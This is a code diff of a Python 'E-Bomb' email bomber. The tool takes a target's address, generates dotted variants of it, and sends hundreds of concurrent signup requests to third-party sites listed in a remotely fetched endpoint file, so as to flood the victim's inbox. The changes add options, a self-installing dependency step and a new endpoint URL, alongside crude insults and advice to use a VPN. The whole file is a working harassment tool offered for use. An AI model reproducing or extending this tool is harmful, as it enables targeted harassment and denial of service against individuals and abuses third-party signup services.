@@ -1,49 +1,74 @@
-# ███╗   ██╗ ██████╗ ████████╗███████╗███████╗   
-# ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝██╔════╝   
-# ██╔██╗ ██║██║   ██║   ██║   █████╗  ███████╗  
-# ██║╚██╗██║██║   ██║   ██║   ██╔══╝  ╚════██║   
-# ██║ ╚████║╚██████╔╝   ██║   ███████╗███████║       
-# ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝       
+# ███╗   ██╗ ██████╗ ████████╗███████╗███████╗
+# ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝██╔════╝
+# ██╔██╗ ██║██║   ██║   ██║   █████╗  ███████╗
+# ██║╚██╗██║██║   ██║   ██║   ██╔══╝  ╚════██║
+# ██║ ╚████║╚██████╔╝   ██║   ███████╗███████║
+# ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝
 # What Ive Worked On:
 # removed the discord webhook logging feature for the moment
 # New menu / "Frontend" UI :3 + credits etc
 
-import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle, fade, sys, colorama, threading, requests
+import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle, fade, sys, colorama, threading, requests, trio
 from pystyle import Center
 from colorama import Fore, Style, init
+
+try:
+    import requests
+    import aiohttp
+    import pystyle
+    import fade
+    import colorama
+    import trio
+
+except ModuleNotFoundError as e:
+    missing_module = str(e).split("'")[1]
+    os.system(f"pip install {missing_module}")
+    print(f"Installed {missing_module}, restarting script...")
+    os.execv(sys.executable, ["python"] + sys.argv)
 
 size = 600  # Threads + Process / Iterations
 cap = None  # thread limit / set to None for unlimited. Only go higher than 500 is u got a fucking beast of a pc CPU wise.
 random_threads = True  # True = Threads Random. False = They Arent Random
 include_nsfw_sites = True  # True = Include NSFW sites. False = No NSFW sites
+include_special_characters = True # added if u want to include special characters for the password when ur sending the api requests
 timeout = aiohttp.ClientTimeout(total=20)
 init(autoreset=True)
+
 
 def restart_main():
     asyncio.run(main())
 
+
 def clear_console():
     os.system("cls" if os.name == "nt" else "clear")
 
+
+# thank you c++ to python converter :fire:
+# i didnt wanna write that all again personally
 def update_title():
     while True:
         title = "[t.me/influenceable]" + "".join(
             random.choices(
-                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=30
+                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+                k=30,
             )
         )
-        os.system(f"title {title}" if os.name == "nt" else f"\033]0;{title}\007")
+        os.system(
+            f"title {title}" if os.name == "nt" else f"\033]0;{title}\007"
+        )
         time.sleep(0.2)
 
-# fuck this looks so ugly but it works
+
+# why the fuck did i have it repeating the clear_console() function and then making it sleep for .5 of a second
+# gotta love 3 in the morning code
 def credit():
-    clear_console()
-    time.sleep(0.5)
     clear_console()
     print(Center.XCenter(faded_credits))
     time.sleep(5)
 
     # skidded from chatgpt
+
+
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
@@ -63,7 +88,9 @@ def generate_email_variants(email):
                 variant = variant[:index] + "." + variant[index:]
             variants.append(variant)
 
-    data = list(sorted(dict.fromkeys([variant + "@" + domain for variant in variants])))
+    data = list(
+        sorted(dict.fromkeys([variant + "@" + domain for variant in variants]))
+    )
     results = [email] + random.sample(data, k=len(data))
     return results
 
@@ -93,6 +120,7 @@ def divide():
 
 progress = 0
 
+
 def update_progress():
     global progress
     progress += 1
@@ -101,7 +129,8 @@ def update_progress():
     white = "█" * int(amount - int((1 - decimal) * amount))
     black = "░" * int(amount - int(decimal * amount))
     print(
-        f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」", end="\r"
+        f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」",
+        end="\r",
     )
     if progress >= total:
         print("\r")
@@ -116,7 +145,7 @@ async def fetch(
     sub: str,
     info,
     name: str = None,
-    bias: bool = False,
+    testing: bool = False,
 ):
     def fix(lol):
         try:
@@ -168,6 +197,7 @@ async def fetch(
             if status_codes.get(name) is None:
                 status = resp.status
                 resp = await resp.text()
+                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
                 if is_html_string(resp):
                     words = [
                         "Denied",
@@ -199,7 +229,8 @@ async def fetch(
                         "An account using this email address has already been registered.",
                         "Permission Denied",
                     ]
-                    if any([word.lower() in resp.lower() for word in words]):
+                    if any([word in evaluation.lower() for word in words]):
+                        evaluation = "FAILURE"
                         status = 400
                 resp = (
                     resp.strip()
@@ -208,61 +239,84 @@ async def fetch(
                     .replace("\t", "")[:1000]
                 )
                 if status_codes.get(name) is None:
-                    if info.get("bias") == True:
-                        status = 200
                     status_codes[name] = {
                         "method": method,
                         "status": status,
+                        "evaluation": evaluation,
                         "url": url,
                         "resp": resp,
                     }
-    except (Exception, asyncio.CancelledError, AssertionError, TimeoutError) as err:
+    except (
+        Exception,
+        asyncio.CancelledError,
+        AssertionError,
+        TimeoutError,
+    ) as err:
         pass
     return update_progress()
 
 
 text = """   
-                        ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
-                        ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
-                        █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
-                        ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
-                        ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
-                        ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
-                                                      t.me/influenceable
-                                                        pls use a vpn :)
+                                       ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
+                                       ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+                                       █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
+                                       ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+                                       ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+                                       ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
+                                                                      t.me/influenceable
+                                                                       pls use a vpn :)
+                                                        
+                                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                        
 """
 
 credits = """   
-                        ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
-                        ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
-                        █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
-                        ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
-                        ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
-                        ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
-                        
-                        
-                                          =+= Credits =+=
-                                            Email Bomber
-                                         Founder: Inkthirsty
-                                         Sigma Dev: Disbuted
-                                    =+= Keep Open Source Open =+=
-""" 
+                             ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
+                             ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+                             █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
+                             ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+                             ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+                             ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
+                             
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                    
+                                               =+= Credits =+=
+                                                 Email Bomber
+                                              Founder: Inkthirsty
+                                              Sigma Dev: Disbuted  
+                                         =+= Keep Open Source Open =+=
+                                  
+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                                  
+"""
+
 
 def menu():
     threading.Thread(target=update_title, daemon=True).start()
     clear_console()
     print(Center.XCenter(faded_text))
-    print(f"\r\n                                                     [{blue_dash}] Main Menu:")
-    print(f"\r                                                     [{blue_dash}] 1. Start E-Bomb")
-    print(f"\r                                                     [{blue_dash}] 2. Credits")
-    print(f"\r                                                     [{blue_dash}] 3. Exit")
-    choice = input("                                                     Enter your choice: ")
+    print(
+        f"\r\n                                                     [{blue_dash}] Main Menu:"
+    )
+    print(
+        f"\r                                                     [{blue_dash}] 1. Start E-Bomb"
+    )
+    print(
+        f"\r                                                     [{blue_dash}] 2. Credits"
+    )
+    print(
+        f"\r                                                     [{blue_dash}] 3. Exit"
+    )
+    choice = input(
+        "                                                     Enter your choice: "
+    )
     return choice
 
+
+# banners
 faded_text = fade.purpleblue(text)
 faded_credits = fade.purpleblue(credits)
 
-# Main Colours
+# ui colours
 yellow_dash = f"{Fore.YELLOW}-{Style.RESET_ALL}"
 red_dash = f"{Fore.RED}-{Style.RESET_ALL}"
 green_dash = f"{Fore.GREEN}-{Style.RESET_ALL}"
@@ -276,7 +330,9 @@ async def main():
         async with aiohttp.ClientSession() as session:
             directory = os.path.dirname(__file__)
             try:
-                with open(os.path.join(directory, "functions.json"), "r") as file:
+                with open(
+                    os.path.join(directory, "functions.json"), "r"
+                ) as file:
                     functions = json.load(file)
             except Exception:
                 print(f"\r[{red_dash}] No Data Found, Refering To Backup Data")
@@ -286,7 +342,7 @@ async def main():
                 print(f"\r[{yellow_dash}] Connecting now...")
                 time.sleep(3)
                 async with session.get(
-                    "https://raw.githack.com/disbuted/Email-Spammer/refs/heads/main/functions.json"
+                    "https://rawcdn.githack.com/Inkthirsty/Email-Spammer/ce70ff9a875692f37d7fca5aedae2db7e93c1f11/functions.json"  # changed to
                 ) as resp:
                     functions = json.loads(await resp.text())
                     clear_console()
@@ -298,6 +354,7 @@ async def main():
                     clear_console()
                     print(Center.XCenter(faded_text))
 
+            # functions = {i: functions[i] for i in list(functions)[:-1]}
             functions = {
                 i: functions[i]
                 for i in list(functions)
@@ -314,9 +371,14 @@ async def main():
                 string.ascii_uppercase,
                 string.digits,
             ]
-            for _ in samples:
-                password += "".join(random.sample(_, k=5))
-                password = "!" + "".join(random.sample(password, k=len(password)))
+
+            if include_special_characters:
+                samples.append(string.punctuation) # makes special characters a true or false statement
+
+            for sample in samples:
+                password += "".join(random.sample(sample, k=5))
+
+            password = "!" + "".join(random.sample(password, k=len(password))) 
 
             email = None
             while True:
@@ -329,7 +391,9 @@ async def main():
                     break
                 clear_console()
                 print(Center.XCenter(faded_text))
-                print(f"\r[{red_dash}] That isnt a fucking email address you retard")
+                print(
+                    f"\r[{red_dash}] That isnt a fucking email address you retard"
+                )
                 print(f"\r[{green_dash}] Lets try that again :)")
                 time.sleep(2)
                 await main()
@@ -340,7 +404,9 @@ async def main():
                 try:
                     limit = clamp(len(variants), 1, cap or float("inf"))
                     threads = (
-                        input(f"\r[{yellow_dash}] Threads per batch (1-{limit}): ")
+                        input(
+                            f"\r[{yellow_dash}] Threads per batch (1-{limit}): "
+                        )
                         .strip()
                         .lower()
                     )
@@ -391,7 +457,9 @@ async def main():
                     f"\r[{green_dash}] Pretesting endpoints to grant 2 minutes of life ♥ ♥ ♥"
                 )
                 test_tasks = [
-                    asyncio.create_task(fetch(session, email, values, name))
+                    asyncio.create_task(
+                        fetch(session, email, values, name, True)
+                    )
                     for name, values in functions.items()
                 ]
                 total = len(test_tasks)
@@ -399,7 +467,9 @@ async def main():
                     await asyncio.gather(*test_tasks)
                 except Exception:
                     pass
-                working = [k for k, v in status_codes.items() if v.get("status") < 400]
+                working = [
+                    k for k, v in status_codes.items() if v.get("status") < 400
+                ]
                 print(
                     f"\r[{yellow_dash}] {len(working)}/{len(test_tasks)} endpoints may be working"
                 )
@@ -424,7 +494,8 @@ async def main():
             print(f"\r[{green_dash}] Sending Emails!")
             for j in range(0, len(queue), size):
                 tasks = [
-                    asyncio.create_task(fetch(*task)) for task in queue[j : j + size]
+                    asyncio.create_task(fetch(*task))
+                    for task in queue[j : j + size]
                 ]
                 try:
                     await asyncio.gather(*tasks)
@@ -444,22 +515,23 @@ async def main():
             ) as resp:
                 words = ", ".join(random.sample(await resp.json(), k=5))
             prefix = "an" if words[0] in "aeiou" else "a"
-            print(f"\r[{green_dash}] I hope you have {prefix} {words} day ^_^")
+            print(
+                f"\r[{green_dash}] I hope you have {prefix} {words} day ^_^"
+            )  # chelpus ahh code
             with open(
                 os.path.join(directory, "results.txt"), "w", encoding="utf-8"
             ) as file:
                 e = "\n\n".join(
                     [
                         (
-                            f"{name or 'Unknown'} -- {values.get('method')} -- {values.get('status')}\nRESPONSE: {values.get('resp')}"
+                            f"{name or 'Unknown'} -- {values.get('method')} -- {values.get('status')} -- {values.get('evaluation')}\nURL: {values.get('url')}\nRESPONSE: {values.get('resp')}"
                         )
                         for name, values in status_codes.items()
                     ]
                 )
                 file.write(e)
             time.sleep(2)
-          # asyncio.run(main()) # needs to be async to a recurring loop. will sort when i wanna 
-            sys.exit()
+            trio.run(menu)
     except Exception as error:
         print(error)
         print(
@@ -475,7 +547,7 @@ if __name__ == "__main__":
     except Exception:
         pass
     while True:
-        choice = menu()  
+        choice = menu()
         if choice == "1":
             asyncio.run(main())
         elif choice == "2":
@@ -483,8 +555,10 @@ if __name__ == "__main__":
         elif choice == "3":
             clear_console()
             print(Center.XCenter(faded_text))
-            print(f"\r\n                                                 [{green_dash}] Thank You For Using E-Bomb!")
-            time.sleep(20)
+            print(
+                f"\r\n                                                 [{green_dash}] Thank You For Using E-Bomb!"
+            )
+            time.sleep(3)  # why the fuck was this set to 20 seconds.... sigma
             sys.exit()
         else:
             clear_console()
